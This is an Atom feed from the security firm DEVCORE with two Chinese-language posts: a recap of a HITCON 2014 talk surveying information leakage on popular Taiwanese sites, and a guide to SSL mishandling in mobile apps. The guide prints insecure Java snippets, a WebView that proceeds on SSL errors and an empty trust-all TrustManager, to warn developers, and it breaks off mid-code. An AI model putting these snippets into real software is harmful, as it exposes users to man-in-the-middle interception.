<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 
 <title>DEVCORE 戴夫寇爾</title>
 <link href="http://devco.re/" rel="self"/>
 <link href="http://devco.re"/>
 <updated>2014-09-17T22:35:48+08:00</updated>
 <id>http://devco.re</id>
 <author>
   <name>DEVCORE</name>
   <email>contact [at] devco.re</email>
 </author>

 
 <entry>
   <title>被遺忘的資訊洩漏－重點回顧</title>
   <link href="http://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/"/>
   <updated>2014-08-26T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</id>
   <content type="html">
&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-8oFs--PeQRg/U_xM6u373RI/AAAAAAAAAos/eT4wfRradUg/w878-h659-no/information_leakage_hitcon2014.jpg&quot; alt=&quot;被遺忘的資訊洩漏 / Information Leakage in Taiwan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在今年駭客年會企業場，我們分享了一場『被遺忘的資訊洩漏』。資訊洩漏是十幾年前就被一提再提的議題，在資訊安全領域中也是最最最基本該注意的事情，然而至今很多網站都還是忽略它，甚至連一些熱門網站都仍有資訊洩漏問題。議程中我們舉了大量的例子證明資訊洩漏其實可以很嚴重，希望能幫大家複習一下，如果網站沒有注意這些，會造成什麼樣的後果。議程投影片如下所示，就讓我們來總結一下吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;center&gt;&lt;iframe src=&quot;http://www.slideshare.net/slideshow/embed_code/38312258&quot; width=&quot;560&quot; height=&quot;460&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot;&gt; &lt;/iframe&gt;&lt;/center&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;devcore-&quot;&gt;DEVCORE 常利用的資訊洩漏&lt;/h3&gt;

&lt;p&gt;首先我們從過往滲透測試經驗中挑選了幾個常見的資訊洩漏問題，分別如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;管理介面洩漏 (p8-p19)&lt;/li&gt;
  &lt;li&gt;目錄(Index of)洩漏 (p20-p28)&lt;/li&gt;
  &lt;li&gt;錯誤訊息洩漏 (p29-p35)&lt;/li&gt;
  &lt;li&gt;暫存、測試資訊 (p36-p46)&lt;/li&gt;
  &lt;li&gt;版本控管 (p47-p55)&lt;/li&gt;
  &lt;li&gt;DNS 資訊洩漏 (p56-p63)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上種種不同洩漏方式，可能會洩漏出系統環境資訊、程式碼內容、含有帳號密碼的設定檔等。透過這些資訊，駭客就能組織出一個有效的攻擊行動。我們甚至在過往的經驗中，只透過目標的資訊洩漏，就直接取得資料庫操作權限(詳見投影片 p65-p71)。&lt;/p&gt;

&lt;p&gt;為了解目前一些熱門網站是否重視這些最基本的保護，我們實際對 alexa 台灣前 525 名的網站進行資訊洩漏的調查。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-nkTDQZHfH1Y/U_xNFWwqgsI/AAAAAAAAAo0/ElXB9PWtF1s/w878-h659-no/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin 頁面洩漏狀況&quot; /&gt;
&lt;img src=&quot;https://lh4.googleusercontent.com/-To2bi4RSj-E/U_xNGVtGRrI/AAAAAAAAAo8/cIL9Gw15Yv0/w878-h659-no/phpinfo_leak.jpg&quot; alt=&quot;phpinfo 頁面洩漏狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在管理介面和測試頁面洩漏的項目，我們用很保守的方式測試根目錄下是否存有 phpmyadmin 和 phpinfo 頁面，結果分別有 7% 和 9% 的網站有這樣的問題。這樣的結果非常令人訝異，畢竟受測網站都是知名且有技術力的網站，而且並非所有網站都使用 php 開發，再加上我們只是測試預設的命名，實際洩漏的情況會更多！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-cswPNS5-A3Q/U_xNHRv8hcI/AAAAAAAAApE/7xwduuTUug8/w878-h659-no/version_control_leak.jpg&quot; alt=&quot;版本控制洩漏狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一個值得一提的是版本控管洩漏問題，我們同樣保守的只針對版本控管軟體中 GIT 和 SVN 兩項進行調查。結果竟然有 10% 的網站有這樣的問題。這個現象非常嚴重！這個現象非常嚴重！這個現象非常嚴重！這個洩漏有機會能還原整個服務的原始碼，被攻擊成功的機率相當高！台灣熱門的網站裡，十個裡面就有一個存有這樣的問題，非常危險，煩請看到這篇文章的朋友能去注意貴公司的網站是否存在這樣的問題。&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;大數據資料蒐集&lt;/h3&gt;

&lt;p&gt;在這場議程中，我們還提到了另一個層次的資訊洩漏議題：當全世界主機的服務及版本資訊全部都被收集起來，會發生什麼樣的事情？&lt;/p&gt;

&lt;p&gt;駭客擁有這樣的資料，就能夠在非常短暫的時間內篩選出有問題的主機，進行大量的入侵。我們利用類似的技術針對台灣主機快速的進行掃描，就發現了台灣有 61414 台主機可以被利用來做 DNS Amplification DDoS 攻擊、1003 台主機可以被利用來做 NTP Amplification DDoS 攻擊。也就是說，駭客可以在短時間內組織一支六萬多人的台灣大軍，可以針對他想要攻擊的目標進行攻擊。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-BBzmwDTmrtk/U_xPpzBhcnI/AAAAAAAAApY/OtleTlTFIrA/w878-h659-no/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed 尚未修復的狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;利用相同的技術，我們也順便檢驗了前陣子非常熱門的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 問題。OpenSSL Heartbleed 被稱之為『近十年網路最嚴重的安全漏洞』，其嚴重程度可以想見，然而根據我們的觀察，台灣至今仍有 1480 台 HTTP 伺服器尚未修復，而台灣前 525 大熱門網站中，也有 21 個(4%)網站未修復。足見台灣網站對於資安的意識仍然不夠。&lt;/p&gt;

&lt;p&gt;對於這樣海量收集資料衍生的資安議題，我們認為最大的受害者，是物聯網的使用者！就我們的觀察，物聯網的設備通常安全防護不佳，容易遭受到駭客攻擊，前陣子 &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP 也出了一份報告指出&lt;/a&gt;，物聯網的設備有七成存在弱點，而且每台設備平均有 25 個弱點。除此之外，物聯網的設備不易更新，少有人會定期更新，更導致物聯網設備可以被大範圍的攻擊，進而滲透家用網路，危害使用者居家隱私。這是個未來需要持續關注的重要議題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-2Cj8HGgmtHs/U_xPqgVi1CI/AAAAAAAAApg/YpZkYboUk24/w878-h659-no/synolocker.jpg&quot; alt=&quot;仍暴露在 SynoLocker 風險狀況統計&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後，我們用最近 SynoLocker 的案例為大數據資料蒐集作結，SynoLocker 是一款針對 Synology 的勒索軟體，去年底 Synology 官方已經推出新版修正問題，本月 SynoLocker 擴散至全世界，新聞一再強調需要更新 NAS，但我們針對台灣 1812 台對外開放的 Synology NAS 做統計，至今仍發現有 64％ 的使用者沒有更新，也就是這些 NAS 仍暴露在 SynoLocker 的風險中。這件事情又再次證明駭客有能力在短時間利用大數據資料找到攻擊目標，也順帶說明了台灣資安意識普遍不足的問題。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在這次議題我們關注了很古老的資訊洩漏問題，並且發現目前台灣一些熱門網站仍然存在這樣的問題。資訊洩漏也許不是一件很嚴重的事情，但往往能激起駭客高漲的情緒，駭客會認為一個網站連最最最基本的資料保護都沒有做到，一定會存在其他資安問題，進而進行更大量的攻擊行為。而事實上，我們也從實例證明了其實資訊洩漏可以很嚴重，希望網站提供者能夠注重這個簡單可解決且重要的議題。&lt;/p&gt;

&lt;p&gt;我們也提到了駭客透過平常大量的資料收集，在需要的時候能快速找到目標並且大範圍攻擊。這其中又以物聯網的用戶影響最多。面對這樣的議題，我們建議除了適當的隱藏(偽造)主機版本資訊以避免出現 0-Day 時成為首要攻擊目標。我們也提倡要對自己的服務做普查，了解自己到底對外開啟了什麼服務，以及關注自己使用的&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;第三方套件&lt;/a&gt;是否有安全更新。&lt;/p&gt;

&lt;p&gt;希望明年不需要再有一篇『依舊沒改變的資訊洩漏』！大家快點注意這件簡單的事情吧！&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>手機應用程式開發上被忽略的 SSL 處理</title>
   <link href="http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/"/>
   <updated>2014-08-15T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</id>
   <content type="html">
&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/Fd1iUVkdWXPxlYucic4NznDQT9L4CQCR2gYL3KI-2Qs=w514-h686-no&quot; alt=&quot;SSL&quot; /&gt;
&lt;!-- Credit: http://natashenka.ca/printable-ssl-posters/ --&gt;&lt;/p&gt;

&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;

&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3KUlB8qAxng/U-oq77eBmvI/AAAAAAAAAlw/Ul4v9jNaSXY/w846-h577-no/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop 警告圖&quot; /&gt;
而在手機應用程式上 HTTPS 同樣重要，例如網路銀行、線上購物等。系統同樣會做憑證核對，但對被判定為無效的憑證就需要開發者作出額外的處理了。許多手機應用程式開發商在這個部分並沒有妥善處理好，以下我們就幾個常見的成因做基本的探討。&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;會被系統判定為無效的常見成因？&lt;/h3&gt;
&lt;p&gt;在探討該如何處理這個問題之前，這裡先列出一些有可能被系統判定成無效憑證的成因。&lt;/p&gt;

&lt;h4 id=&quot;note1&quot;&gt;1. 系統支援問題 &lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
&lt;p&gt;在 Android 2.2 及之前的版本，對 SSL 的支援上存在著一些問題，像是 &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=12908&quot;&gt;SNI&lt;/a&gt; 和 &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=26542&quot;&gt;Multiple Chain&lt;/a&gt;。而 Android 上不接受缺少中繼 CA 憑證的憑證鏈，例如：&lt;a href=&quot;https://egov.uscis.gov/&quot;&gt;https://egov.uscis.gov/&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-1&quot;&gt;2. 相關憑證未被預載到系統中&lt;/h4&gt;
&lt;p&gt;以 GCA 簽發的 SSL 憑證為例，在 Windows 上被判定為有效，但在 iOS 系統上卻因為 CA 不在系統的預載清單中而被判定為無效。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-1Aeo7DIPjMg/U-o1hpl5ZTI/AAAAAAAAAmk/jodyNvjqpTs/w741-h654-no/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;
&lt;img src=&quot;https://lh4.googleusercontent.com/kXM1zDdNKQitgCAvIqIkTAz8fgi_QgPA3rBb8kP49jg=w457-h686-no&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-2&quot;&gt;3. 使用自行簽發的憑證&lt;/h4&gt;
&lt;p&gt;這種情況常出現在應用程式開發階段的內部測試環境中，由於是內部測試環境一般都不會花錢去申請憑證。&lt;/p&gt;

&lt;h4 id=&quot;mitm&quot;&gt;4. 連線被中間人(MITM)攻擊&lt;/h4&gt;
&lt;p&gt;當連線被 MITM 攻擊時，使用者原本的連線目的地會被導到攻擊者的設備上，此時伺服器憑證也會被取代成攻擊者自行簽發的憑證，造成原本正常的連線出現異常。&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;開發者該如何處理？&lt;/h3&gt;

&lt;p&gt;理想情況下，客戶端的支援度充足，伺服器憑證鏈的來源及設定正確，只需使用系統原有的方式去檢查憑證即可達到安全效果。但若非得要相容低版本系統或是自行簽發憑證的時候，就得自行做額外的檢查。&lt;/p&gt;

&lt;p&gt;在處理方式上，普遍是使用憑證綁定 (certificate pinning) 的方式，把需要比對的憑證預先存放在應用程式裡，待要進行 SSL Handshake 的時候再與伺服器的憑證做比對。&lt;/p&gt;

&lt;p&gt;可是在實務上，大多開發人員採用消極的方法，把錯誤警告略過讓連線繼續進行，使得本來使用 SSL 加密連線帶來的安全性形同虛設。據 2012 年 &lt;a href=&quot;http://android-ssl.org/files/p50-fahl.pdf&quot;&gt;Why Eve and Mallory Love Android: An Analysis of SSL (In)Security on Android&lt;/a&gt; 這篇論文指出，在 Google Play 上 13500 個免費熱門應用程式當中，共有 1074 個 (8%) 應用程式因錯誤的 SSL 處理而導致使用者陷入 MITM 攻擊的風險中。&lt;/p&gt;

&lt;p&gt;下面我們整理了一些在手機應用開發上，常見的 SSL 處理錯誤，以及其對應適當的處理方法。&lt;/p&gt;

&lt;h4 id=&quot;android-1&quot;&gt;Android 錯誤處理情況1&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceivedSslError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SslErrorHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SslError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;proceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;當透過 WebView 元件訪問 HTTPS 網站發生 SSL 錯誤時，會觸發 onReceivedSslError 這個函數。根據官方文件指出，可藉由執行 handler.proceed() 或是 handler.cancel() 來決定是否讓連線繼續進行。在不覆寫這函數的情況下預設會執行 handler.cancel()。而上面的做法卻讓異常的連線繼續進行了。&lt;/p&gt;

&lt;p&gt;較為恰當的做法是使用 handler.cancel() 讓連線終止，或是限制在開發階段才執行 handler.proceed()。像 &lt;a href=&quot;https://github.com/apache/cordova-android/blob/3.5.1/framework/src/org/apache/cordova/CordovaWebViewClient.java#L298&quot;&gt;Apache Coradova&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/facebook/facebook-android-sdk/blob/sdk-version-3.15.0/facebook/src/com/facebook/widget/WebDialog.java#L420&quot;&gt;Facebook Android SDK&lt;/a&gt; 皆有對這部分做控管。&lt;/p&gt;

&lt;h4 id=&quot;android-2&quot;&gt;Android 錯誤處理情況2&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;X509TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkClientTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkServerTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAcceptedIssuers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;TLS&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;本用來檢查伺服器憑證的 checkServerTrusted 被留空，導致警告被略過。Google 建議不要自行實作 TrustManager，而是把憑證放到 KeyStore，再把 KeyStore 放到 TrustManagerFactory，最後從 TrustManagerFactory 產出相關的 TrustManager，開發文件中有提供處理的&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html#UnknownCa&quot;&gt;範例&lt;/a&gt;。OWASP 的 WIKI 上也有提供自行實作 TrustManager 做 certificate pinning 的&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning#Android&quot;&gt;範例&lt;/a&gt;。&lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;下面節錄 Android 官方文件上的範例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KeyStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultAlgorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;TLS&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTrustManagers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
